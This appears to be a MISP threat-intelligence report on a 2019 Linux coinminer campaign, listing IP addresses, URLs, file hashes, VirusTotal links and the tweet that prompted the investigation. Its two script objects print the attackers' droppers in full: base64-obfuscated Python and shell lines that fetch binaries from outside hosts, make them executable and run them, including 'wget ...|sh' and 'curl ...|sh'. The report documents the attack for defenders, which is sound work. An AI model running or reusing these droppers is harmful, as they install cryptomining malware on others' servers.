# Threat Report: 2019-06-01: Linux server infection with coinminers (derived from original post with iptables rules)


## Key Intelligence
* Date: 2019-06-01
* Threat Level: 3 (Low)
* Tags: type:OSINT, osint:lifetime="perpetual", osint:certainty="50", tlp:white, misp-galaxy:malpedia="Coinminer", misp-galaxy:tool="CoinMiner", misp-galaxy:mitre-attack-pattern="Resource Hijacking - T1496", misp-galaxy:mitre-attack-pattern="Command-Line Interface - T1059"

---

## Indicators of Compromise (IOCs)
### Artifacts dropped
* md5: <md5> — Coinminer
* sha256: <sha256> — Coinminer

### Network activity
* url: http://165.227.140.184/tmp/nww

### Payload delivery
* attachment: liu.png

## Objects
### ip-port — An IP address (or domain or hostname) and a port seen as a tuple (or as a triple) in a specific time frame.
* [Network activity] ip-dst: 165.227.140.184
* [Network activity] port: 80

### file — File object describing a file with meta-information
* [Artifacts dropped] md5: <md5> — Coinminer
* [Artifacts dropped] sha1: <sha1> — Coinminer
* [Artifacts dropped] sha256: <sha256> — Coinminer

### virustotal-report — VirusTotal report
* [Other] datetime: 2019-02-25T10:14:54 — Coinminer
* [External analysis] link: https://www.virustotal.com/file/7a38a2d4512b775da7ea7c98e03df1ae348493ce512d761013ae123da4379805/analysis/1551089694/ — Coinminer
* [Artifacts dropped] text: 6/53 — Coinminer

### shell-commands — Object describing a series of shell commands executed. This object can be linked with malicious files in order to describe a specific execution of shell commands.
* [Other] text: Bash
* [Other] text: Malicious
* [Other] text: /bin/sh /usr/lib/ConsoleKit/run-session.d/pam-foreground-compat.ck session_removed
* [Other] text: sh -c /var/tmp/sde ryuf
* [Other] text: sh -c /tmp/sde ryuf

### file — File object describing a file with meta-information
* [Artifacts dropped] md5: <md5> — Coinminer
* [Artifacts dropped] sha1: <sha1> — Coinminer
* [Artifacts dropped] sha256: <sha256> — Coinminer

### virustotal-report — VirusTotal report
* [Other] datetime: 2019-02-10T19:49:48 — Coinminer
* [External analysis] link: https://www.virustotal.com/file/0bc0ea8a037baa0154c4c136bf7a3167cfd81f3c33b2969855d4ef5ce0090e72/analysis/1549828188/ — Coinminer
* [Artifacts dropped] text: 1/58 — Coinminer

### shell-commands — Object describing a series of shell commands executed. This object can be linked with malicious files in order to describe a specific execution of shell commands.
* [Other] text: Bash
* [Other] text: Malicious
* [Other] text: atd
* [Other] text: /bin/sh /usr/lib/ConsoleKit/run-session.d/pam-foreground-compat.ck session_removed

### script — Object describing a computer program written to be run in a special run-time environment. The script or shell script can be used for malicious activities but also as support tools for threat analysts.
* [Other] text: #!/bin/sh
if ! ps -ax | grep -v grep | grep "[ ]"$ >/dev/null; then
	  nohup python -c 'import os,urllib; proxies = {"http": "http://41.203.146.142:8080"};f=open("/tmp/hsos","wb");f.write(urllib.urlopen("http://165.227.140.184/tmp/ofd",proxies=proxies
).read());f.close();os.system("chmod +x /tmp/hsos");os.system("chmod 777 /tmp/hsos");os.system("/tmp/hsos")' &
	  sleep 3
	  nohup python3 -c 'import urllib.request; urllib.request.urlretrieve("http://165.227.140.184/tmp/ofd", "/tmp/vov");os.system("chmod 7777 /tmp/vov");os.system("chmod +x /tmp/vov");os
.system("/tmp/vov")' 2>&1
	  sleep 3
	  nohup python -c 'exec("aW1wb3J0IG9zLHVybGxpYixiaW5hc2NpaTsgbD1iaW5hc2NpaS5iMmFfaGV4KG9zLnVyYW5kb20oNCkpOyBoZD11cmxsaWIudXJscmV0cmlldmUgKCJodHRwOi8vODcuMjM2LjIxMi4yMzcvdG1wL29mZCIsI
CIvdG1wLyIrbCk7b3Muc3lzdGVtKCJjaG1vZCA3Nzc3IC90bXAvIitsKTtvcy5zeXN0ZW0oImNobW9kICt4IC90bXAvIitsKTsgb3Muc3lzdGVtKCIvdG1wLyIrbCk=".decode("base64"))' 2>&1
	  sleep 3
	  nohup python -c 'exec("aW1wb3J0IG9zLHVybGxpYixiaW5hc2NpaTtsPWJpbmFzY2lpLmIyYV9oZXgob3MudXJhbmRvbSg0KSk7aD1vcy5wYXRoLmV4cGFuZHVzZXIoIn4vIitsKTtwcm94aWVzPXsiaHR0cCI6Imh0dHA6Ly8yMTEuM
jQuMTAzLjIyODo4MCJ9O2Y9b3BlbihoLCJ3YiIpO2Yud3JpdGUodXJsbGliLnVybG9wZW4oImh0dHA6Ly84Ny4yMzYuMjEyLjIzNy90bXAvb2ZkIixwcm94aWVzPXByb3hpZXMpLnJlYWQoKSk7Zi5jbG9zZSgpO29zLnN5c3RlbSgiY2htb2QgNzc3NyB
7fSIuZm9ybWF0KGgpKTtvcy5zeXN0ZW0oImNobW9kICt4IHt9Ii5mb3JtYXQoaCkpOyBvcy5zeXN0ZW0oInt9ICYiLmZvcm1hdChoKSk=".decode("base64"))' 2>&1
	  wget -O - http://185.165.169.6/jp/_j.sh|sh ; curl http://185.165.169.6/jp/_j.jpg|sh
fi
* [Other] text: Bash
* [Other] text: Malicious

### file — File object describing a file with meta-information
* [Payload delivery] malware-sample: ofd|9f189f26da1206151ce39e5aab269ff6
* [Payload delivery] filename: ofd
* [Payload delivery] md5: <md5>
* [Payload delivery] sha1: <sha1>
* [Payload delivery] sha256: <sha256>
* [Other] size-in-bytes: 56392

### url — url object describes an url along with its normalized field (like extracted using faup parsing library) and its metadata.
* [Network activity] url: http://87.236.212.237/tmp/ofd
* [Network activity] hostname: 87.236.212.237
* [Other] text: http
* [Other] text: /tmp/ofd

### script — Object describing a computer program written to be run in a special run-time environment. The script or shell script can be used for malicious activities but also as support tools for threat analysts.
* [Other] text: #!/bin/sh
id1="fkbgh"
id2="jm"
if [ -x "/tmp/" ] && [ -w "/tmp/" ]; then
wget -O /tmp/`echo $id1` http://185.165.169.6/jp/`echo $id2`
curl -o /tmp/`echo $id1` http://185.165.169.6/jp/`echo $id2`
chmod +x /tmp/`echo $id1`
chmod 7777 /tmp/`echo $id1`
/tmp/`echo $id1` &
elif [ -x "/var/tmp/" ] && [ -w "/var/tmp/" ]; then
wget -O /var/tmp/`echo $id1` http://185.165.169.6/jp/`echo $id2`
curl -o /var/tmp/`echo $id1` http://185.165.169.6/jp/`echo $id2`
chmod +x /var/tmp/`echo $id1`
chmod 7777 /var/tmp/`echo $id1`
/var/tmp/`echo $id1` &
elif [ -x "/dev/shm/" ] && [ -w "/dev/shm/" ]; then
wget -O /dev/shm/`echo $id1` http://185.165.169.6/jp/`echo $id2`
curl -o /dev/shm/`echo $id1` http://185.165.169.6/jp/`echo $id2`
chmod +x /dev/shm/`echo $id1`
chmod 7777 /dev/shm/`echo $id1`
/dev/shm/`echo $id1` &
elif [ -x $JBOSS_HOME ] && [ -w $JBOSS_HOME ]; then
wget -O $JBOSS_HOME/`echo $id1` http://185.165.169.6/jp/`echo $id2`
curl -o $JBOSS_HOME/`echo $id1` http://185.165.169.6/jp/`echo $id2`
chmod +x $JBOSS_HOME/`echo $id1`
chmod 7777 $JBOSS_HOME/`echo $id1`
$JBOSS_HOME/`echo $id1` &
elif [ -x $HOME ] && [ -w $HOME ]; then
wget -O $HOME/`echo $id1` http://185.165.169.6/jp/`echo $id2`
curl -o $HOME/`echo $id1` http://185.165.169.6/jp/`echo $id2`
chmod +x $HOME/`echo $id1`
chmod 7777 $HOME/`echo $id1`
$HOME/`echo $id1` &
else
wget -O `echo $id1` http://185.165.169.6/jp/`echo $id2`
curl -o `echo $id1` http://185.165.169.6/jp/`echo $id2`
chmod +x `echo $id1`
chmod 7777 `echo $id1`
`echo $id1` &
fi
* [Other] text: Bash
* [Other] text: Malicious

### url — url object describes an url along with its normalized field (like extracted using faup parsing library) and its metadata.
* [Network activity] url: http://185.165.169.6/jp/

### url — url object describes an url along with its normalized field (like extracted using faup parsing library) and its metadata.
* [Network activity] url: http://87.236.212.237/tmp/ofd
* [Other] text: http

### url — url object describes an url along with its normalized field (like extracted using faup parsing library) and its metadata.
* [Network activity] url: http://41.203.146.142:8080

### file — File object describing a file with meta-information
* [Payload delivery] malware-sample: 3d02bbddc185352ddc1dea20f54e2f2b39f180a9bd26d8453b5ad7b983466c95|9ae7dc5ff13526e8cc5b8c236066a828
* [Payload delivery] filename: 3d02bbddc185352ddc1dea20f54e2f2b39f180a9bd26d8453b5ad7b983466c95
* [Payload delivery] md5: <md5>
* [Payload delivery] sha1: <sha1>
* [Payload delivery] sha256: <sha256>
* [Other] size-in-bytes: 58088

### ip-port — An IP address (or domain or hostname) and a port seen as a tuple (or as a triple) in a specific time frame.
* [Network activity] ip-dst: 45.77.54.157

### file — File object describing a file with meta-information
* [Payload delivery] malware-sample: slpr|f049ae13406fdebadb10960bc0deee87
* [Payload delivery] filename: slpr
* [Payload delivery] md5: <md5>
* [Payload delivery] sha1: <sha1>
* [Payload delivery] sha256: <sha256>
* [Other] size-in-bytes: 88728

### url — url object describes an url along with its normalized field (like extracted using faup parsing library) and its metadata.
* [Network activity] url: 37.228.129.58/home/slpr
* [Other] text: http
* [Other] text: /home/slpr

### microblog — Microblog post like a Twitter tweet or a post on a Facebook wall.
* [Other] text: latest iptables commands found in new linux #PACHA backdoor sample, MD5=a4ef2477af0c769bb2043bca6b5843c2, the ACCEPTED IP should all be blacklisted.
* [Other] text: Twitter
* [Network activity] url: https://twitter.com/liuya0904/status/1134660970112999425
* [Other] text: liuya0904
* [Other] text: Informative

### annotation — An annotation object allowing analysts to add annotations, comments, executive summary to a MISP event, objects or attributes.
* [Other] text: markdown
* [Other] text: Annotation
* [Other] text: OSINT investigation based on the original tweet from Liu Ya which contains a netfilter/iptables script with some IP addresses. By pivoting from the IP addresses, malware samples and script can be found at different locations. This quick analysis include the scripts collected, the samples and the relationships between the various objects.
